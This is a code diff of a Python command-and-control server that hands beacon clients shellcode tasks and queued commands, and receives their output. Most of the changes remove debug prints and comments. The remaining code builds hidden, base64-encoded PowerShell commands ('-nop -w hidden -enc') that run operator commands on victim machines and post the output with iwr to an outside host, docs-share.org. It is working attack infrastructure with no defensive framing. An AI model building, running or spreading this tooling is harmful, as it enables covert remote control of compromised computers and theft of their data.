@@ -27,7 +27,6 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
         if self.path == BEACON_PATH:
             log(f"[+] Beacon: {self.client_address[0]}")
 
-            # Priority 1: Send binary payloads (like executor shellcode)
             if TASK_QUEUE:
                 task_file = TASK_QUEUE.pop(0)
                 if os.path.exists(task_file):
@@ -43,7 +42,6 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
                 else:
                     log(f"[-] Task file not found: {task_file}")
 
-            # Priority 2: Send queued commands (for executor)
             if CMD_QUEUE:
                 cmd = CMD_QUEUE.pop(0)
                 cmd_bytes = cmd.encode('utf-8')
@@ -82,32 +80,23 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
         self.send_error(404, "Not found")
 
     def do_POST(self):
-        print(f"[DEBUG] POST request received for path: '{self.path}'")
-        # Check if path ends with /results (handles ///results vs /results normalization)
         if self.path.endswith('/results'):
             content_length = int(self.headers.get('Content-Length', 0))
-            print(f"[DEBUG] Content-Length: {content_length}")
-            sys.stdout.flush()
             if content_length > 0:
-                # Read strictly the content length
                 output = self.rfile.read(content_length)
-                print(f"[DEBUG] Raw output bytes: {output}")
-                sys.stdout.flush()
                 try:
                     decoded = output.decode('utf-8', errors='replace')
                 except:
                     decoded = str(output)
                 log(f"[+] Output from {self.client_address[0]}:\n{'-'*40}\n{decoded}\n{'-'*40}")
-            else:
-                 print("[DEBUG] Content-Length was 0")
             
             try:
                 self.send_response(200)
                 self.send_header('Content-Type', 'text/plain')
-                self.send_header('Content-Length', '0') # Explicit string '0'
+                self.send_header('Content-Length', '0')
                 self.end_headers()
-            except Exception as e:
-                 print(f"[DEBUG] Failed to send response: {e}")
+            except Exception:
+                 pass
             return
 
         self.send_error(404, "Not found")
@@ -116,7 +105,6 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
         pass
 
 def command_input_thread():
-    """Background thread for queuing commands."""
     print()
     while True:
         try:
@@ -131,12 +119,8 @@ def command_input_thread():
                 TASK_QUEUE.append(task_file)
                 print(f"[+] Queued task: {task_file}")
             else:
-                # Ensure precise content length by converting to bytes
-                # Force string conversion "" + $o to prevent null errors
-                # Disable Expect100Continue to prevent deadlock with simple Python server
                 raw_ps = f'[System.Net.ServicePointManager]::Expect100Continue = $false; $o=({cmd} *>&1 | Out-String); if ([string]::IsNullOrEmpty($o)) {{ $o = " " }}; $b=[System.Text.Encoding]::UTF8.GetBytes($o); iwr https://docs-share.org///results -UseBasicParsing -Method POST -Body $b'
                 
-                # Encode to UTF-16LE then Base64 for -EncodedCommand
                 encoded_cmd = base64.b64encode(raw_ps.encode('utf-16le')).decode('utf-8')
                 ps_cmd = f'powershell -nop -w hidden -enc {encoded_cmd}'
                 CMD_QUEUE.append(ps_cmd)
@@ -149,10 +133,8 @@ def command_input_thread():
 
 def run():
     server_address = (HOST, PORT)
-    # Use ThreadingHTTPServer so one blocked request doesn't freeze the whole C2
     httpd = http.server.ThreadingHTTPServer(server_address, C2Handler)
     
-    # Check for SSL certs
     if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
@@ -175,7 +157,6 @@ def run():
              print("[!] Failed to generate certs. Exiting.")
              return
 
-    # Start command input thread
     input_thread = threading.Thread(target=command_input_thread, daemon=True)
     input_thread.start()
 
